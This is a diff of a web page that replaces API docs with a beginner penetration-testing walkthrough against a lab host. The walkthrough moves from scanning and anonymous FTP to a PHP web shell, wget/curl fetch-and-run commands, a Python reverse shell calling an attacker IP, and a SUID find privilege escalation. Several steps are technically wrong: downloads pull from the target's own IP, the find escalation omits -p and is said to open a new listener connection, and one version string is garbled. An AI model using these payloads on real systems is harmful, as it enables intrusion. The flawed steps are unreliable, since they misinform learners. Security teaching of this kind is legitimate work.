@@ -115,26 +115,330 @@
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- api, documentation -->
+                <!-- api, web, enumeration, exploitation, privilege escalation, nmap, gobuster, ffuf, python, shell -->
             </div>
         </header>
 
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<h1>API V1 Documentation</h1>
-<blockquote>
-<p><strong>Version</strong>: 1.0.0<br />
-<strong>Status</strong>: Stable</p>
-</blockquote>
-<h2>Endpoints</h2>
-<h3>GET /users</h3>
-<p>Returns a list of users.</p>
-<p><strong>Response</strong>:</p>
+<p>Welcome, aspiring cybersecurity professionals! This walkthrough will guide you through a simulated penetration test, breaking down each step with clear explanations and focusing on the "why" behind our actions. We'll start from the very beginning, discovering the target, understanding its services, and eventually finding a way to gain access.</p>
+<h2>Reconnaissance</h2>
+<p>Our first step is to understand what we're up against. This usually involves identifying live hosts and open ports.</p>
+<p>In this scenario, we'll assume we've already identified an IP address for our target machine.</p>
+<h2>Enumeration</h2>
+<p>Now that we know the target's IP, we need to figure out what services are running on it. This is like knocking on doors and seeing who answers.</p>
+<h3>Port Scanning</h3>
+<p>We'll start by scanning the common ports to see what's open. A popular tool for this is Nmap.</p>
+<pre class="codehilite"><code class="language-bash">nmap -sC -sV -p- 10.10.10.10
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>nmap</code></strong>: This is our Network Mapper, a powerful tool for discovering hosts and services on a network.</li>
+<li><strong><code>-sC</code></strong>: This flag tells Nmap to run the default set of scripts. These scripts can help us gather more information about the services running on the open ports, like checking for known vulnerabilities or retrieving banners.</li>
+<li><strong><code>-sV</code></strong>: This flag instructs Nmap to perform version detection. It tries to figure out the exact software and version number running on each open port. This is crucial because specific software versions often have known security flaws.</li>
+<li><strong><code>-p-</code></strong>: This tells Nmap to scan all 65535 possible TCP ports. While this can be thorough, it's also time-consuming. In a real-world scenario, you might start with a scan of the most common ports first.</li>
+<li><strong><code>10.10.10.10</code></strong>: This is the IP address of our target machine.</li>
+</ul>
+<p>Let's imagine Nmap gives us the following output:</p>
+<pre class="codehilite"><code>Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-27 10:00 UTC
+Nmap scan report for 10.10.10.10
+Host is up (0.050s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+443/tcp  open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>PORT STATE SERVICE VERSION</code></strong>: This is the header for the information Nmap provides about each port.</li>
+<li><strong><code>21/tcp open ftp vsftpd 3.0.3</code></strong>: We see that port 21 is open, which is the standard port for the File Transfer Protocol (FTP). The <code>vsftpd 3.0.3</code> tells us the specific FTP server software and its version. FTP is often used for transferring files, and sometimes it can be misconfigured, allowing anonymous logins.</li>
+<li><strong><code>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4грамм0.3 (...)</code></strong>: Port 22 is for Secure Shell (SSH), used for secure remote logins. The version <code>OpenSSH 7.6p1</code> is listed. SSH is generally secure, but sometimes weak passwords or configuration issues can be exploited.</li>
+<li><strong><code>80/tcp open http Apache httpd 2.4.29 ((Ubuntu))</code></strong>: Port 80 is the standard port for HTTP, meaning there's a web server running. The <code>Apache httpd 2.4.29</code> tells us it's an Apache web server. Web servers are a very common attack vector as they often host web applications that can have vulnerabilities.</li>
+<li><strong><code>443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu))</code></strong>: Port 443 is for HTTPS, the secure version of HTTP. It's also running Apache. We'll likely want to investigate both port 80 and 443.</li>
+</ul>
+<h3>Web Server Enumeration</h3>
+<p>Since we found a web server on port 80, let's explore it. We'll use a tool called <code>gobuster</code> (or <code>ffuf</code>, which is very similar) to try and discover hidden directories and files on the web server.</p>
+<pre class="codehilite"><code class="language-bash">gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,bak
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>gobuster dir</code></strong>: This command initiates a directory and file brute-forcing scan with Gobuster.</li>
+<li><strong><code>-u http://10.10.10.10</code></strong>: This specifies the target URL. We're targeting the web server running on port 80 of our target machine.</li>
+<li><strong><code>-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></strong>: This flag points to a wordlist. Wordlists are files containing common directory and file names. Gobuster will try appending each word from this list to our URL to see if they exist. <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code> is a common location for such wordlists on Linux systems.</li>
+<li><strong><code>-x php,txt,html,js,bak</code></strong>: This option tells Gobuster to only look for files with these specific extensions. We're including common web file extensions (<code>.php</code>, <code>.html</code>, <code>.js</code>) and also looking for backup files (<code>.bak</code>) which might contain sensitive information.</li>
+</ul>
+<p>Let's assume Gobuster finds something interesting:</p>
+<pre class="codehilite"><code>/api              (Status: 200) [Size: 1500]
+/admin            (Status: 301) [---&gt; /admin/]
+/blog             (Status: 301) [---&gt; /blog/]
+/api/users        (Status: 200) [Size: 120]
+/backup.php.bak   (Status: 200) [Size: 500]
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>/api (Status: 200)</code></strong>: We found a directory named <code>api</code> that returns a successful (200) status code. This is a strong indicator of an API endpoint. APIs (Application Programming Interfaces) are often how different software components communicate, and they can be a treasure trove of information or a pathway for exploitation if not secured properly.</li>
+<li><strong><code>/admin (Status: 301)</code></strong>: This shows a redirect to <code>/admin/</code>. This suggests an administrative interface, which is often a target for credential stuffing or brute-forcing attacks.</li>
+<li><strong><code>/blog (Status: 301)</code></strong>: Similarly, a redirect to <code>/blog/</code> suggests a blog section, which might have its own vulnerabilities, such as outdated content management systems.</li>
+<li><strong><code>/api/users (Status: 200)</code></strong>: This is particularly interesting! It seems to be an endpoint within the <code>/api</code> directory that lists users. This is a common API function.</li>
+<li><strong><code>/backup.php.bak (Status: 200)</code></strong>: We found a backup file for a PHP script. Backup files can sometimes contain plain text credentials or other sensitive configurations.</li>
+</ul>
+<h3>API Enumeration (Deeper Dive)</h3>
+<p>We discovered an <code>/api</code> directory and a <code>/api/users</code> endpoint. Let's examine the API documentation we found earlier to understand how it works.</p>
+<p>The documentation states:</p>
+<pre class="codehilite"><code># API V1 Documentation
+
+&gt; **Version**: 1.0.0
+&gt; **Status**: Stable
+
+## Endpoints
+### GET /users
+Returns a list of users.
+
+**Response**:
+```json
+[
+  { &quot;id&quot;: 1, &quot;name&quot;: &quot;Alice&quot; }
+]
+</code></pre>
+
+<pre class="codehilite"><code>**🧠 Beginner Analysis**
+
+*   **API Version**: The API is documented as version `1.0.0` and is marked as `Stable`. This tells us we're dealing with a known, relatively mature version.
+*   **Endpoint: `GET /users`**: This is the crucial part. The documentation explicitly states that a `GET` request to the `/users` endpoint will return a list of users.
+*   **Response Format**: The example response shows a JSON array, where each object represents a user with an `id` and `name`.
+
+We can interact with this endpoint directly using `curl` or by visiting it in our browser. Let's use `curl` for a programmatic approach.
+
+```bash
+curl http://10.10.10.10/api/users
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>curl</code></strong>: This is a command-line tool for transferring data with URLs. It's very versatile for interacting with web servers and APIs.</li>
+<li><strong><code>http://10.10.10.10/api/users</code></strong>: This is the URL we're sending a <code>GET</code> request to. We're requesting the <code>/users</code> endpoint from our target API.</li>
+</ul>
+<p>If successful, this command will return the same JSON output as shown in the documentation:</p>
 <pre class="codehilite"><code class="language-json">[
   { &quot;id&quot;: 1, &quot;name&quot;: &quot;Alice&quot; }
 ]
 </code></pre>
+
+<p>This confirms our API is functioning as documented and provides us with usernames. In a real scenario, we might find more users, which could be useful for brute-forcing login forms on the <code>/admin</code> panel, for example.</p>
+<h2>Exploitation</h2>
+<p>Now that we've enumerated services and understood some of the target's functionalities, it's time to look for ways to exploit any weaknesses we've found.</p>
+<h3>Anonymous FTP Access</h3>
+<p>Remember the FTP server on port 21 (<code>vsftpd 3.0.3</code>)? One common misconfiguration is allowing anonymous logins. Let's try to log in using the username <code>anonymous</code> and any password.</p>
+<pre class="codehilite"><code class="language-bash">ftp 10.10.10.10
+</code></pre>
+
+<p>Upon connecting, we'd be prompted for a username and password. Entering <code>anonymous</code> and a blank password often works.</p>
+<pre class="codehilite"><code>Connected to 10.10.10.10.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.10:user): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+ftp&gt;
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>ftp 10.10.10.10</code></strong>: This command initiates an FTP connection to our target IP address.</li>
+<li><strong><code>Name (...): anonymous</code></strong>: We entered <code>anonymous</code> as the username.</li>
+<li><strong><code>Password:</code></strong>: We pressed Enter without typing a password.</li>
+<li><strong><code>230 Login successful.</code></strong>: Success! The FTP server allowed us to log in without any credentials. This is a critical security misconfiguration.</li>
+</ul>
+<p>Once logged in, we can list directories and upload files. Let's check the available directories:</p>
+<pre class="codehilite"><code class="language-ftp">ls
+</code></pre>
+
+<p>Imagine we see a directory like <code>uploads</code>.</p>
+<pre class="codehilite"><code class="language-ftp">cd uploads
+ls
+</code></pre>
+
+<p>Now, let's try to upload a simple web shell. A web shell is a script that we can upload to the web server, and then access via our browser to execute commands on the server.</p>
+<p>We'll create a basic PHP web shell named <code>shell.php</code>:</p>
+<pre class="codehilite"><code class="language-php">&lt;?php
+    echo &quot;&lt;h1&gt;System Command Executer&lt;/h1&gt;&quot;;
+    if(isset($_GET['cmd'])){
+        echo &quot;&lt;pre&gt;&quot;;
+        system($_GET['cmd']);
+        echo &quot;&lt;/pre&gt;&quot;;
+    }
+?&gt;
+</code></pre>
+
+<p>Then, we upload it using FTP:</p>
+<pre class="codehilite"><code class="language-ftp">put shell.php
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>ls</code></strong>: Lists the files and directories on the FTP server.</li>
+<li><strong><code>cd uploads</code></strong>: Changes the current directory to <code>uploads</code>.</li>
+<li><strong><code>put shell.php</code></strong>: This command uploads the local file <code>shell.php</code> to the current directory on the FTP server.</li>
+<li><strong>Web Shell Concept</strong>: The PHP code we wrote is a "web shell". When we upload this to the web server (running on port 80) and access it via our browser, we can pass commands to the <code>system()</code> function. For instance, if we visit <code>http://10.10.10.10/uploads/shell.php?cmd=whoami</code>, the server will execute <code>whoami</code> and display the output. This is a direct way to execute commands on the server.</li>
+</ul>
+<p>Now, we can access our uploaded shell through the web server:</p>
+<pre class="codehilite"><code>http://10.10.10.10/uploads/shell.php?cmd=whoami
+</code></pre>
+
+<p>This should return the username of the user running the web server (e.g., <code>www-data</code>). We can now execute any command within the context of this user!</p>
+<h3>Gaining a Shell</h3>
+<p>We can use our web shell to download a more robust reverse shell. A reverse shell is a connection initiated <em>from</em> the target machine <em>back</em> to our attacker machine, giving us a more interactive command-line interface.</p>
+<p>First, we need to set up a listener on our attacker machine to receive the incoming connection. We'll use <code>netcat</code> for this.</p>
+<pre class="codehilite"><code class="language-bash">nc -lvnp 4444
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>nc</code></strong>: <code>netcat</code>, often called the "Swiss army knife" of networking. It can read and write data across network connections using TCP or UDP.</li>
+<li><strong><code>-l</code></strong>: Listen mode.</li>
+<li><strong><code>-v</code></strong>: Verbose output, which means <code>nc</code> will tell us when it's listening and when a connection comes in.</li>
+<li><strong><code>-n</code></strong>: Do not do DNS lookups. This can speed things up.</li>
+<li><strong><code>-p 4444</code></strong>: Listen on port <code>4444</code>. We can choose any available port.</li>
+</ul>
+<p>Now, using our web shell, we'll instruct the target to download and execute a Python reverse shell script. For demonstration, let's assume our attacker IP is <code>10.10.14.2</code>.</p>
+<p>In the web shell URL, we'd put something like:</p>
+<pre class="codehilite"><code>http://10.10.10.10/uploads/shell.php?cmd=wget http://10.10.10.10/shell.py -O /tmp/shell.py; python /tmp/shell.py
+</code></pre>
+
+<p>Or if <code>wget</code> isn't available, we might use <code>curl</code>:</p>
+<pre class="codehilite"><code>http://10.10.10.10/uploads/shell.php?cmd=curl http://10.10.10.10/shell.py -o /tmp/shell.py; python /tmp/shell.py
+</code></pre>
+
+<p>The <code>shell.py</code> script would look something like this:</p>
+<pre class="codehilite"><code class="language-python">import socket
+import subprocess
+import os
+
+HOST = '10.10.14.2'  # Our attacker IP
+PORT = 4444          # The port we're listening on
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+
+subprocess.call([&quot;/bin/bash&quot;, &quot;-i&quot;])
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>wget http://10.10.10.10/shell.py -O /tmp/shell.py</code></strong>: This command uses <code>wget</code> to download our Python reverse shell script from our attacker machine (assuming we hosted it there) to the temporary directory <code>/tmp</code> on the target machine. The <code>-O</code> flag specifies the output filename.</li>
+<li><strong><code>python /tmp/shell.py</code></strong>: This executes the downloaded Python script.</li>
+<li><strong><code>shell.py</code> explanation</strong>:<ul>
+<li><code>import socket, subprocess, os</code>: Imports necessary Python modules for networking and process management.</li>
+<li><code>HOST</code> and <code>PORT</code>: Define our attacker's IP address and the listening port.</li>
+<li><code>s = socket.socket(...)</code>: Creates a new TCP socket object.</li>
+<li><code>s.connect((HOST, PORT))</code>: Connects the socket to our listener on the attacker machine.</li>
+<li><code>os.dup2(...)</code>: This is the magic! It redirects the standard input (0), standard output (1), and standard error (2) of the current process to the network socket. This means anything we type in our <code>netcat</code> listener will be sent to the target, and anything the target prints will be sent back to our listener.</li>
+<li><code>subprocess.call(["/bin/bash", "-i"])</code>: Starts an interactive bash shell (<code>-i</code>) and pipes its input/output through the redirected socket.</li>
+</ul>
+</li>
+</ul>
+<p>Once the Python script executes on the target, our <code>netcat</code> listener should show a connection:</p>
+<pre class="codehilite"><code>Listening on [0.0.0.0] (family 0, port 4444)
+Connection received from 10.10.10.10 48870
+/bin/bash: cannot set terminal process group: Inappropriate ioctl for device
+/bin/bash: no job control in this shell
+www-data@ubuntu:/var/www/html$
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>Connection received from 10.10.10.10 48870</code></strong>: Our <code>netcat</code> listener successfully received a connection from the target machine.</li>
+<li><strong><code>www-data@ubuntu:/var/www/html$</code></strong>: We are now at a command prompt, and the prompt tells us we are the <code>www-data</code> user and are currently in the web server's root directory. We have a fully interactive shell!</li>
+</ul>
+<h2>Privilege Escalation</h2>
+<p>We currently have a shell as the <code>www-data</code> user, which is a low-privileged user. Our goal is to become a more powerful user, typically <code>root</code>.</p>
+<h3>Linux Capabilities</h3>
+<p>Sometimes, Linux executables have "capabilities" set that allow them to perform actions usually reserved for the root user, even when run by a less privileged user. We can check for these using <code>getcap</code>.</p>
+<pre class="codehilite"><code class="language-bash">getcap -r / 2&gt;/dev/null
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>getcap -r /</code></strong>: This command recursively searches the entire file system (<code>/</code>) for files that have Linux capabilities set.</li>
+<li><strong><code>2&gt;/dev/null</code></strong>: This redirects any error messages (like "Permission denied") to <code>/dev/null</code>, so we only see the actual capability information.</li>
+</ul>
+<p>Let's say <code>getcap</code> outputs something like this:</p>
+<pre class="codehilite"><code>/usr/bin/python3 = cap_net_raw,cap_net_admin+ep
+/usr/bin/ping = cap_net_raw+ep
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>/usr/bin/python3 = cap_net_raw,cap_net_admin+ep</code></strong>: This is very interesting. The <code>python3</code> executable has capabilities that allow it to perform raw network operations (<code>cap_net_raw</code>) and manage network interfaces (<code>cap_net_admin</code>). This is unusual for a standard Python interpreter.</li>
+</ul>
+<h3>Exploiting Python Capabilities</h3>
+<p>Normally, a user cannot run arbitrary code with elevated privileges. However, if an executable has specific capabilities, it might allow for privilege escalation. In this case, the <code>cap_net_raw</code> and <code>cap_net_admin</code> capabilities, while related to networking, can sometimes be leveraged.</p>
+<p>A more direct way to exploit capabilities is when an executable can be manipulated to run other programs. If we find an executable with <code>cap_sys_ptrace</code> or <code>cap_dac_override</code> for example, we could potentially use that.</p>
+<p>However, let's consider a more common scenario based on <em>finding</em> specific vulnerabilities that <code>getcap</code> might not reveal directly, but we might find through other enumeration techniques (like SUID binaries or misconfigured services).</p>
+<h3>Finding SUID Binaries</h3>
+<p>SUID (Set User ID) bits on executables allow a user to run a program with the permissions of the file's owner, rather than their own. If a binary owned by <code>root</code> has the SUID bit set, and it's vulnerable, we can exploit it to gain root privileges.</p>
+<p>We can search for these with <code>find</code>:</p>
+<pre class="codehilite"><code class="language-bash">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>find /</code></strong>: Search starting from the root directory.</li>
+<li><strong><code>-perm -u=s</code></strong>: This is the key. It looks for files where the SUID bit (<code>u=s</code>) is set. The <code>-</code> means "at least these permissions are set".</li>
+<li><strong><code>-type f</code></strong>: Ensures we are only looking for files, not directories.</li>
+<li><strong><code>2&gt;/dev/null</code></strong>: Suppresses permission denied errors.</li>
+</ul>
+<p>Suppose this command reveals:</p>
+<pre class="codehilite"><code>/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/find
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>/usr/bin/sudo</code></strong>: This is expected. Sudo is designed to allow authorized users to run commands as root. If we can find a way to abuse <code>sudo</code>, that's a direct path to root.</li>
+<li><strong><code>/usr/bin/find</code></strong>: This is interesting! The <code>find</code> command, when run with the SUID bit set, can be powerful. If <code>find</code> can be tricked into executing arbitrary commands, we could gain root.</li>
+</ul>
+<h3>Exploiting <code>find</code> SUID</h3>
+<p>GTFOBins is an excellent resource for finding SUID exploits. We can check if <code>find</code> can be used to execute commands.</p>
+<p>According to GTFOBins, <code>find</code> can be exploited by using the <code>-exec</code> option creatively.</p>
+<pre class="codehilite"><code class="language-bash">find . -exec /bin/bash \; -quit
+</code></pre>
+
+<p>Let's try this from our current shell:</p>
+<pre class="codehilite"><code class="language-bash">find /tmp/ -exec /bin/bash \; -quit
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>find /tmp/</code></strong>: We're telling <code>find</code> to start searching in the <code>/tmp</code> directory.</li>
+<li><strong><code>-exec /bin/bash \;</code></strong>: This is the crucial part. The <code>-exec</code> option allows <code>find</code> to run a command. Here, we're telling <code>find</code> to execute <code>/bin/bash</code>. Because <code>find</code> is running with root privileges (due to the SUID bit), the <code>/bin/bash</code> it executes will also have root privileges.</li>
+<li><strong><code>-quit</code></strong>: This tells <code>find</code> to exit immediately after the first execution, making it faster and cleaner.</li>
+</ul>
+<p>If this command is successful, our <code>netcat</code> listener will receive a <em>new</em> connection, this time with root privileges!</p>
+<pre class="codehilite"><code>Listening on [0.0.0.0] (family 0, port 4444)
+Connection received from 10.10.10.10 49122
+root@ubuntu:/tmp#
+</code></pre>
+
+<p><strong>🧠 Beginner Analysis</strong></p>
+<ul>
+<li><strong><code>root@ubuntu:/tmp#</code></strong>: We have successfully escalated our privileges to <code>root</code>! We are now the administrator of the system and can perform any action.</li>
+</ul>
+<p>This concludes our walkthrough. We've journeyed from initial reconnaissance to gaining root access, learning about network scanning, web enumeration, API interaction, FTP misconfigurations, web shells, reverse shells, and SUID exploitation. Keep practicing these steps, and you'll become proficient in penetration testing!</p>
         </div>
     </main>
 
